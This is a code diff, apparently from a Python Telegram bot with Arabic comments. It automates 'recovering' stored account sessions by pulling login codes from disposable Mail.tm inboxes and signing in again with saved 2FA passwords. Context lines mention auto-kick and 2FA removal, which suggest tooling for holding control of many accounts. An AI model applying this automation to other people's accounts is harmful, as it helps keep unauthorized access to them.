@@ -40,6 +40,9 @@ from config import (
     EMAIL_MIGRATION_DELAY,
     AUTO_KICK_DELAY_24H,
     AUTO_KICK_DELAY_RETRY,
+    SESSION_RECOVERY_MAX_ATTEMPTS,
+    SESSION_RECOVERY_RETRY_DELAY,
+    INVALID_SESSION_RESCAN_INTERVAL,
 )
 
 logger = logging.getLogger(__name__)
@@ -48,6 +51,7 @@ pending_clients: dict = {}
 _recovery_tasks: dict[str, asyncio.Task] = {}
 _auto_kick_tasks: dict[str, asyncio.Task] = {}
 _recovery_scheduled: set[str] = set()
+_recovery_fail_count: dict[str, int] = {}
 _recovery_on_done = None
 
 OFFICIAL_SENDERS = (777000, 42777)
@@ -449,9 +453,15 @@ async def remove_two_fa(phone: str, current_password: str) -> dict:
 # بريد Login (Mail.tm)
 # ──────────────────────────────────────────
 async def fetch_code_from_email(
-    address: str, password: str, attempts: int = 12, interval: int = 5
+    address: str,
+    password: str,
+    attempts: int = 36,
+    interval: int = 5,
+    exclude_ids: set[str] | None = None,
 ) -> str | None:
-    return await mailtm.fetch_code(address, password, attempts, interval)
+    return await mailtm.fetch_code(
+        address, password, attempts, interval, exclude_ids=exclude_ids
+    )
 
 
 async def existing_login_email_ok(row, client=None) -> str | None:
@@ -698,58 +708,120 @@ def _normalize_login_code(raw: str | None) -> str | None:
     return digits[:5] if len(digits) >= 5 else digits
 
 
-async def _request_login_code_via_email(client, phone: str):
+def _sent_code_delivery_label(sent) -> str:
+    return type(sent.type).__name__ if sent and sent.type else "Unknown"
+
+
+async def _request_login_code_via_email(client, phone: str) -> tuple[str, str]:
     """طلب كود دخول — يُفضّل إرساله إلى بريد Login المربوط."""
     norm = database.normalize_phone(phone)
     sent = await client.send_code_request(norm)
     phone_code_hash = sent.phone_code_hash
-    if "Email" in type(sent.type).__name__:
-        return phone_code_hash
-    for _ in range(3):
+    delivery = _sent_code_delivery_label(sent)
+    if "Email" in delivery:
+        return phone_code_hash, delivery
+    for attempt in range(5):
         try:
-            sent = await client(
-                ResendCodeRequest(norm, phone_code_hash)
-            )
+            sent = await client(ResendCodeRequest(norm, phone_code_hash))
             phone_code_hash = sent.phone_code_hash
-            if "Email" in type(sent.type).__name__:
-                return phone_code_hash
+            delivery = _sent_code_delivery_label(sent)
+            if "Email" in delivery:
+                return phone_code_hash, delivery
         except Exception as e:
-            logger.debug("resend login code %s: %s", phone, e)
-        await asyncio.sleep(2)
-    return phone_code_hash
+            logger.debug("resend login code %s attempt %s: %s", phone, attempt, e)
+        await asyncio.sleep(3)
+    return phone_code_hash, delivery
+
+
+def _recovery_error_retryable(error: str) -> bool:
+    err = (error or "").lower()
+    markers = (
+        "لم يصل كود",
+        "mail.tm",
+        "صندوق",
+        "البريد",
+        "الهاتف",
+        "sms",
+        "app",
+        "فشل فتح",
+    )
+    return any(m in err for m in markers)
 
 
 async def recover_session(phone: str) -> dict:
     row = await database.get_session_by_phone(phone)
     if not row:
-        return {"success": False, "error": "الجلسة غير موجودة"}
+        return {"success": False, "error": "الجلسة غير موجودة", "retryable": False}
     login_email = database.row_login_email(row)
-    if not login_email or not row["email_password"]:
-        return {"success": False, "error": "لا يوجد بريد Login محفوظ"}
+    email_password = row["email_password"]
+    if not login_email or not email_password:
+        return {
+            "success": False,
+            "error": "لا يوجد بريد Login محفوظ",
+            "retryable": False,
+        }
+
+    if not await mailtm.verify_mailbox(login_email, email_password):
+        return {
+            "success": False,
+            "error": f"فشل فتح صندوق Mail.tm: {login_email}",
+            "retryable": True,
+        }
+
+    try:
+        exclude_ids = await mailtm.snapshot_message_ids(login_email, email_password)
+    except Exception as e:
+        return {
+            "success": False,
+            "error": f"فشل قراءة بريد Mail.tm: {e}",
+            "retryable": True,
+        }
 
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     await client.connect()
     try:
-        phone_code_hash = await _request_login_code_via_email(client, phone)
+        phone_code_hash, delivery = await _request_login_code_via_email(client, phone)
+        logger.info("recover %s code delivery: %s", phone, delivery)
+
+        if "Email" not in delivery:
+            return {
+                "success": False,
+                "error": (
+                    f"تيليجرام أرسل الكود عبر {delivery} وليس البريد — "
+                    f"لن يصل إلى Mail.tm ({login_email})"
+                ),
+                "retryable": True,
+                "delivery": delivery,
+            }
 
         raw_code = await fetch_code_from_email(
-            login_email, row["email_password"], attempts=24, interval=5
+            login_email,
+            email_password,
+            attempts=36,
+            interval=5,
+            exclude_ids=exclude_ids,
         )
         code = _normalize_login_code(raw_code)
         if not code:
             return {
                 "success": False,
                 "error": (
-                    "لم يصل كود الدخول لبريد Mail.tm المحفوظ — "
-                    "ربما غُيّر بريد Login على الحساب"
+                    f"لم يصل كود جديد إلى Mail.tm خلال ~3 دقائق ({login_email}) — "
+                    f"تحقق أن تيليجرام يرسل الكود للبريد وليس SMS"
                 ),
+                "retryable": True,
+                "delivery": delivery,
             }
 
         try:
             await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
         except SessionPasswordNeededError:
             if not row["two_fa"]:
-                return {"success": False, "error": "يتطلب 2FA غير محفوظ"}
+                return {
+                    "success": False,
+                    "error": "يتطلب 2FA غير محفوظ",
+                    "retryable": False,
+                }
             await client.sign_in(password=row["two_fa"])
 
         session_string = client.session.save()
@@ -760,20 +832,21 @@ async def recover_session(phone: str) -> dict:
             phone, username, full_name, session_string, row["two_fa"]
         )
         _recovery_scheduled.discard(phone)
+        _recovery_fail_count.pop(phone, None)
         return {"success": True, "email": login_email}
     except (PhoneCodeInvalidError, PhoneCodeExpiredError):
         return {
             "success": False,
-            "error": "كود الدخول من البريد غير صالح أو منتهي",
+            "error": "كود الدخول من البريد غير صالح أو منتهي — سيتم إعادة المحاولة",
+            "retryable": True,
         }
     except Exception as e:
         err = str(e)
-        if "EMAIL" in err.upper() or "CODE" in err.upper():
-            return {
-                "success": False,
-                "error": f"فشل الإنعاش عبر البريد: {err}",
-            }
-        return {"success": False, "error": err}
+        return {
+            "success": False,
+            "error": err,
+            "retryable": _recovery_error_retryable(err),
+        }
     finally:
         await client.disconnect()
 
@@ -834,35 +907,103 @@ async def _post_kick_session_watch(phone: str):
     schedule_standard_recovery(phone)
 
 
+async def _schedule_recovery_if_needed(
+    phone: str, on_done=None, delay: int | None = None
+) -> bool:
+    if phone in _recovery_scheduled:
+        return False
+    if delay is None:
+        from config import SESSION_RECOVERY_DELAY
+
+        delay = SESSION_RECOVERY_DELAY
+    schedule_session_recovery(phone, delay, on_done=on_done)
+    return True
+
+
 async def startup_recover_dead_sessions(on_done=None) -> dict:
     """
-    عند تشغيل السيرفر: فحص كل الجلسات ذات بريد Login وإنعاش الميتة.
+    عند التشغيل: جلسات ميتة + غير صالحة (لها بريد) → إنعاش.
     """
-    global _recovery_scheduled
-    _recovery_scheduled.clear()
     sessions = await database.get_all_sessions()
-    scheduled = revived_in_db = dead = 0
+    invalid_rows = await database.get_invalid_sessions_with_login_email()
+    scheduled = revived_in_db = dead = invalid_queued = 0
+    seen_phones: set[str] = set()
+
     for s in sessions:
         phone = s["phone"]
         if not database.row_login_email(s) or not s["email_password"]:
             continue
+        seen_phones.add(phone)
         alive = await check_session_alive(phone)
         if alive:
             if not s["valid"]:
                 await database.mark_session_valid(phone)
                 revived_in_db += 1
+                _recovery_fail_count.pop(phone, None)
             continue
         dead += 1
-        schedule_standard_recovery(phone, on_done=on_done)
-        scheduled += 1
-        await asyncio.sleep(0.5)
+        if await _schedule_recovery_if_needed(phone, on_done=on_done):
+            scheduled += 1
+        await asyncio.sleep(0.3)
+
+    for s in invalid_rows:
+        phone = s["phone"]
+        if phone in seen_phones:
+            continue
+        if await check_session_alive(phone):
+            await database.mark_session_valid(phone)
+            revived_in_db += 1
+            _recovery_fail_count.pop(phone, None)
+            continue
+        invalid_queued += 1
+        if await _schedule_recovery_if_needed(phone, on_done=on_done, delay=0):
+            scheduled += 1
+        await asyncio.sleep(0.3)
+
     logger.info(
-        "startup recovery: dead=%s scheduled=%s revived_valid_flag=%s",
+        "startup recovery: dead=%s invalid_queued=%s scheduled=%s revived=%s",
         dead,
+        invalid_queued,
         scheduled,
         revived_in_db,
     )
-    return {"dead": dead, "scheduled": scheduled, "revived_in_db": revived_in_db}
+    return {
+        "dead": dead,
+        "invalid_queued": invalid_queued,
+        "scheduled": scheduled,
+        "revived_in_db": revived_in_db,
+    }
+
+
+async def rescan_invalid_sessions_with_email(on_done=None) -> dict:
+    """إعادة إنعاش الجلسات غير الصالحة التي ما زال لها بريد Login."""
+    rows = await database.get_invalid_sessions_with_login_email()
+    scheduled = revived = 0
+    for s in rows:
+        phone = s["phone"]
+        if await check_session_alive(phone):
+            await database.mark_session_valid(phone)
+            _recovery_fail_count.pop(phone, None)
+            revived += 1
+            continue
+        if await _schedule_recovery_if_needed(
+            phone, on_done=on_done, delay=SESSION_RECOVERY_RETRY_DELAY
+        ):
+            scheduled += 1
+        await asyncio.sleep(0.3)
+    return {"checked": len(rows), "scheduled": scheduled, "revived": revived}
+
+
+async def invalid_sessions_recovery_loop(on_done=None):
+    """دورة دورية: إعادة محاولة الجلسات غير الصالحة ذات البريد."""
+    while True:
+        await asyncio.sleep(INVALID_SESSION_RESCAN_INTERVAL)
+        try:
+            stats = await rescan_invalid_sessions_with_email(on_done=on_done)
+            if stats["scheduled"] or stats["revived"]:
+                logger.info("invalid session rescan: %s", stats)
+        except Exception as e:
+            logger.error("invalid session rescan: %s", e)
 
 
 def schedule_session_recovery(phone: str, delay: int, on_done=None):
